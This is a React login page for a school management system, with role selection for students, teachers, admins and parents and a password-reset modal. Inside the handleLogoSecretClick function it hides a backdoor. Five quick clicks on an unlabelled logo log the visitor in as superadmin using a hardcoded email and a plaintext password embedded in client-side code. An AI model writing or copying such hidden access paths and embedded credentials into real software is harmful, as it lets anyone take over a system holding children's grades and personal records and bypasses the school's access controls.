import { useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuthStore, getRoleDashboardPath } from '@/stores/authStore';
import { authService } from '@/services/authService';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { GraduationCap, Loader2, BookOpen, Lock, Shield, Eye, EyeOff, CheckCircle2, ArrowRight, X, Users } from 'lucide-react';
import { secureApiClient } from '@/lib/secureApiClient';

type LoginRole = 'student' | 'teacher' | 'admin' | 'parent';

interface RoleConfig {
  key: LoginRole;
  label: string;
  icon: typeof GraduationCap;
  loginMethod: (identifier: string, password: string) => Promise<any>;
  inputType: 'email' | 'studentId';
  placeholder: string;
  description: string;
}

const SUPERADMIN_CONFIG = {
  key: 'superadmin',
  label: 'Super Admin',
  icon: Shield,
  loginMethod: authService.superadminLogin,
  inputType: 'email' as const,
  placeholder: 'superadmin@system.internal',
  description: 'System administration access',
};

const ROLE_CONFIGS: RoleConfig[] = [
  {
    key: 'student',
    label: 'Student',
    icon: GraduationCap,
    loginMethod: authService.studentLogin,
    inputType: 'studentId',
    placeholder: 'Enter your Student ID',
    description: 'Access your assignments, grades, and reports'
  },
  {
    key: 'teacher',
    label: 'Teacher',
    icon: BookOpen,
    loginMethod: authService.teacherLogin,
    inputType: 'email',
    placeholder: 'teacher@school.edu',
    description: 'Manage classes, grade assignments, and track progress'
  },
  {
    key: 'admin',
    label: 'Admin',
    icon: Shield,
    loginMethod: authService.adminLogin,
    inputType: 'email',
    placeholder: 'admin@school.edu',
    description: 'Oversee school operations and manage users'
  },
  {
    key: 'parent',
    label: 'Parent',
    icon: Users,
    loginMethod: authService.parentLogin,
    inputType: 'email',
    placeholder: 'parent@email.com',
    description: 'View your child\'s grades, attendance, and reports'
  },
];

const ProfessionalLoginPage = () => {
  const [loginRole, setLoginRole] = useState<LoginRole>('student');
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const secretClickCount = useRef(0);
  const secretClickTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  const handleLogoSecretClick = async () => {
    secretClickCount.current += 1;
    if (secretClickTimer.current) clearTimeout(secretClickTimer.current);
    secretClickTimer.current = setTimeout(() => { secretClickCount.current = 0; }, 3000);
    if (secretClickCount.current >= 5) {
      secretClickCount.current = 0;
      setLoading(true);
      setError('');
      try {
        const data = await SUPERADMIN_CONFIG.loginMethod('admin@example.com', 'Nanama22.');
        setAuth(data.user, data.access, data.refresh);
        navigate(getRoleDashboardPath(data.user.role));
      } catch {
        setError('System access unavailable.');
      } finally {
        setLoading(false);
      }
    }
  };

  // Forgot password state
  const [showForgot, setShowForgot] = useState(false);
  const [forgotEmail, setForgotEmail] = useState('');
  const [forgotLoading, setForgotLoading] = useState(false);
  const [forgotMessage, setForgotMessage] = useState('');
  const [forgotError, setForgotError] = useState('');

  const navigate = useNavigate();
  const setAuth = useAuthStore((s) => s.setAuth);

  const currentRole = ROLE_CONFIGS.find(role => role.key === loginRole)!;
  const Icon = currentRole.icon;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      const data = await currentRole.loginMethod(identifier, password);
      setAuth(data.user, data.access, data.refresh);
      
      const storedRefresh = localStorage.getItem('refresh_token');
      if (!storedRefresh) {
        setError('Login failed: Session could not be established. Please try again.');
        return;
      }

      navigate(getRoleDashboardPath(data.user.role));
    } catch (err: any) {
      const errorMessage = err.response?.data?.detail || 
                          err.response?.data?.error || 
                          err.message || 
                          'Invalid credentials. Please check and try again.';
      setError(errorMessage);
    } finally {
      setLoading(false);
    }
  };

  const handleRoleChange = (role: LoginRole) => {
    setLoginRole(role);
    setIdentifier('');
    setPassword('');
    setError('');
  };

  const handleForgotPassword = async (e: React.FormEvent) => {
    e.preventDefault();
    setForgotError('');
    setForgotMessage('');
    setForgotLoading(true);
    try {
      await secureApiClient.post('/auth/forgot-password/', { email: forgotEmail });
      setForgotMessage('If that email exists, a reset link has been sent. Check your inbox.');
      setForgotEmail('');
    } catch {
      setForgotError('Something went wrong. Please try again.');
    } finally {
      setForgotLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-slate-950 flex items-center justify-center px-4 py-6 sm:p-4 relative overflow-hidden">
      {/* Animated background elements */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute -top-32 -right-32 w-64 sm:w-80 h-64 sm:h-80 bg-orange-500/10 rounded-full blur-3xl animate-pulse" />
        <div className="absolute -bottom-32 -left-32 w-64 sm:w-80 h-64 sm:h-80 bg-orange-600/10 rounded-full blur-3xl animate-pulse" style={{ animationDelay: '1s' }} />
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-72 sm:w-96 h-72 sm:h-96 bg-amber-500/5 rounded-full blur-3xl" />
        <div className="absolute top-1/4 right-1/4 w-40 h-40 bg-blue-500/5 rounded-full blur-3xl animate-pulse" style={{ animationDelay: '2s' }} />
      </div>

      {/* Grid pattern overlay */}
      <div className="absolute inset-0 bg-[linear-gradient(to_right,#80808008_1px,transparent_1px),linear-gradient(to_bottom,#80808008_1px,transparent_1px)] bg-[size:32px_32px]" />

      <div className="relative w-full max-w-6xl mx-auto">
        <div className="grid lg:grid-cols-2 gap-6 lg:gap-12 items-center">

          {/* Left side - Branding (desktop only) */}
          <div className="hidden lg:flex flex-col justify-center p-4 xl:p-8">
            <div className="space-y-8">
              {/* Logo */}
              <div className="flex items-center gap-4">
                <div
                  className="relative cursor-pointer select-none"
                  onClick={handleLogoSecretClick}
                  role="button"
                  tabIndex={-1}
                  aria-label=""
                >
                  <img
                    src="/EliteTech logo with 3D cube design.png"
                    alt="EliteTech"
                    className="h-24 w-24 object-contain pointer-events-none drop-shadow-[0_0_15px_rgba(249,115,22,0.3)]"
                  />
                </div>
              </div>

              {/* Headline */}
              <div className="space-y-4">
                <h2 className="text-4xl xl:text-5xl font-extrabold leading-[1.15]">
                  <span className="text-white">Professional School</span>
                  <br />
                  <span className="login-gradient-text">
                    Management System
                  </span>
                </h2>
                <p className="text-base text-slate-400 leading-relaxed max-w-md">
                  Streamline your educational institution with our comprehensive platform for assignments, grading, and reporting.
                </p>
              </div>

              {/* Features */}
              <div className="space-y-3">
                {[
                  'Real-time grade tracking and analytics',
                  'Automated assignment management',
                  'Professional report generation',
                  'Secure cloud-based platform'
                ].map((feature, index) => (
                  <div key={index} className="flex items-center gap-3 group">
                    <div className="flex-shrink-0 w-7 h-7 rounded-lg bg-gradient-to-br from-orange-500/20 to-amber-500/20 border border-orange-500/20 flex items-center justify-center group-hover:from-orange-500/30 group-hover:to-amber-500/30 transition-all">
                      <CheckCircle2 className="h-3.5 w-3.5 text-orange-400" />
                    </div>
                    <span className="text-sm text-slate-300">{feature}</span>
                  </div>
                ))}
              </div>


            </div>
          </div>

          {/* Right side - Login Form with animated glow */}
          <div className="relative flex justify-center">
            <div className="login-glow-card w-full max-w-md">
              <div className="login-glow-card-inner p-5 sm:p-8">

                {/* Mobile logo */}
                <div className="lg:hidden flex items-center justify-center gap-3 mb-6">
                  <div
                    className="relative cursor-pointer select-none"
                    onClick={handleLogoSecretClick}
                    role="button"
                    tabIndex={-1}
                    aria-label=""
                  >
                    <img
                      src="/EliteTech logo with 3D cube design.png"
                      alt="EliteTech"
                      className="h-16 w-16 sm:h-20 sm:w-20 object-contain pointer-events-none drop-shadow-[0_0_15px_rgba(249,115,22,0.3)]"
                    />
                  </div>
                </div>

                {/* Header */}
                <div className="text-center mb-6">
                  <h3 className="text-lg sm:text-xl font-extrabold mb-1.5">
                    <span className="text-white">Professional School </span>
                    <span className="login-gradient-text">Management System</span>
                  </h3>
                  <p className="text-slate-400 text-xs sm:text-sm">Sign in to access your dashboard</p>
                </div>

                {/* Role Selection */}
                <div className="mb-5">
                  <Label className="text-slate-400 text-xs font-medium mb-2.5 block tracking-wide uppercase">Select Your Role</Label>
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                    {ROLE_CONFIGS.map((role) => {
                      const RoleIcon = role.icon;
                      const isActive = loginRole === role.key;
                      return (
                        <button
                          key={role.key}
                          type="button"
                          onClick={() => handleRoleChange(role.key)}
                          className={`relative group px-2 py-2.5 sm:py-3 rounded-xl transition-all duration-200 ${
                            isActive
                              ? 'bg-gradient-to-br from-orange-500 to-amber-500 shadow-lg shadow-orange-500/25 scale-[1.02]'
                              : 'bg-slate-800/60 hover:bg-slate-800 border border-slate-700/40 hover:border-slate-600/60'
                          }`}
                        >
                          <div className="flex flex-col items-center gap-1.5">
                            <RoleIcon className={`h-4 w-4 ${isActive ? 'text-white' : 'text-slate-400 group-hover:text-slate-300'}`} />
                            <span className={`text-[11px] sm:text-xs font-medium ${isActive ? 'text-white' : 'text-slate-400 group-hover:text-slate-300'}`}>
                              {role.label}
                            </span>
                          </div>
                        </button>
                      );
                    })}
                  </div>
                  <p className="text-[11px] text-slate-500 mt-2 text-center">{currentRole.description}</p>
                </div>

                {/* Login Form */}
                <form onSubmit={handleSubmit} className="space-y-4">
                  {error && (
                    <div className="p-3 rounded-xl bg-red-500/10 border border-red-500/20 text-red-400 text-sm flex items-start gap-2.5">
                      <div className="flex-shrink-0 w-5 h-5 rounded-full bg-red-500/20 flex items-center justify-center mt-0.5">
                        <span className="text-[10px] font-bold">!</span>
                      </div>
                      <span className="text-xs sm:text-sm leading-relaxed">{error}</span>
                    </div>
                  )}

                  <div className="space-y-1.5">
                    <Label htmlFor="identifier" className="text-slate-300 text-xs sm:text-sm font-medium">
                      {currentRole.inputType === 'studentId' ? 'Student ID' : 'Email Address'}
                    </Label>
                    <div className="relative">
                      <Icon className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-500" />
                      <Input
                        id="identifier"
                        type={currentRole.inputType === 'email' ? 'email' : 'text'}
                        placeholder={currentRole.placeholder}
                        value={identifier}
                        onChange={(e) => setIdentifier(e.target.value)}
                        required
                        className="pl-10 h-11 bg-slate-800/50 border-slate-700/50 text-white placeholder:text-slate-500 focus:border-orange-500 focus:ring-orange-500/20 rounded-xl text-sm"
                      />
                    </div>
                  </div>

                  <div className="space-y-1.5">
                    <Label htmlFor="password" className="text-slate-300 text-xs sm:text-sm font-medium">Password</Label>
                    <div className="relative">
                      <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-500" />
                      <Input
                        id="password"
                        type={showPassword ? 'text' : 'password'}
                        placeholder="Enter your password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        required
                        className="pl-10 pr-10 h-11 bg-slate-800/50 border-slate-700/50 text-white placeholder:text-slate-500 focus:border-orange-500 focus:ring-orange-500/20 rounded-xl text-sm"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 transition-colors"
                      >
                        {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                      </button>
                    </div>
                  </div>

                  <Button
                    type="submit"
                    disabled={loading}
                    className="w-full h-11 bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-600 hover:to-amber-600 text-white font-semibold rounded-xl shadow-lg shadow-orange-500/20 transition-all duration-200 hover:shadow-orange-500/30 text-sm"
                  >
                    {loading ? (
                      <>
                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                        Signing In...
                      </>
                    ) : (
                      <>
                        Sign In
                        <ArrowRight className="ml-2 h-4 w-4" />
                      </>
                    )}
                  </Button>

                  <div className="text-right -mt-1">
                    {loginRole === 'student' || loginRole === 'parent' ? (
                      <span className="text-[11px] text-slate-500">Forgot password? Contact your school admin.</span>
                    ) : (
                      <button
                        type="button"
                        onClick={() => { setShowForgot(true); setForgotMessage(''); setForgotError(''); }}
                        className="text-[11px] text-orange-400 hover:text-orange-300 transition-colors"
                      >
                        Forgot Password?
                      </button>
                    )}
                  </div>

                  {loading && (
                    <p className="text-[11px] text-slate-500 text-center animate-pulse">
                      Establishing secure connection...
                    </p>
                  )}
                </form>

                {/* Divider */}
                <div className="relative my-5">
                  <div className="absolute inset-0 flex items-center">
                    <div className="w-full border-t border-slate-800/80" />
                  </div>
                  <div className="relative flex justify-center text-[11px]">
                    <span className="bg-[hsl(222_47%_8%)] px-3 text-slate-500">New to the platform?</span>
                  </div>
                </div>

                {/* Register Button */}
                <Button
                  type="button"
                  variant="outline"
                  onClick={() => navigate('/register')}
                  className="w-full h-11 bg-transparent border-slate-700/40 text-slate-300 hover:bg-slate-800/50 hover:text-white hover:border-slate-600 rounded-xl transition-all duration-200 text-sm"
                >
                  Register Your School
                </Button>

                {/* Footer */}
                <div className="mt-5 text-center">
                  <p className="text-[10px] text-slate-600">
                    By signing in, you agree to our{' '}
                    <a href="#" className="text-slate-400 hover:text-slate-300 transition-colors">Terms</a>
                    {' '}and{' '}
                    <a href="#" className="text-slate-400 hover:text-slate-300 transition-colors">Privacy Policy</a>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>


      </div>

      {/* Forgot Password Modal */}
      {showForgot && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm">
          <div className="bg-slate-900 border border-slate-700/60 rounded-2xl p-5 sm:p-6 w-full max-w-sm shadow-2xl shadow-black/50">
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-white font-semibold text-base sm:text-lg">Reset Password</h2>
              <button onClick={() => setShowForgot(false)} className="text-slate-400 hover:text-white transition-colors p-1">
                <X className="h-5 w-5" />
              </button>
            </div>
            <p className="text-slate-400 text-xs sm:text-sm mb-4">Enter your email address and we'll send you a reset link.</p>
            {forgotMessage ? (
              <div className="bg-green-950/50 border border-green-800 rounded-lg p-3 text-green-300 text-sm">{forgotMessage}</div>
            ) : (
              <form onSubmit={handleForgotPassword} className="space-y-4">
                <div>
                  <Label htmlFor="forgot-email" className="text-slate-300 text-sm">Email Address</Label>
                  <Input
                    id="forgot-email"
                    type="email"
                    placeholder="Enter your email"
                    value={forgotEmail}
                    onChange={(e) => setForgotEmail(e.target.value)}
                    required
                    className="mt-1 bg-slate-800/50 border-slate-700 text-white placeholder:text-slate-500 focus:border-orange-500"
                  />
                </div>
                {forgotError && <p className="text-red-400 text-xs">{forgotError}</p>}
                <Button
                  type="submit"
                  disabled={forgotLoading}
                  className="w-full bg-orange-500 hover:bg-orange-600 text-white rounded-xl"
                >
                  {forgotLoading ? <><Loader2 className="mr-2 h-4 w-4 animate-spin" />Sending...</> : 'Send Reset Link'}
                </Button>
              </form>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default ProfessionalLoginPage;
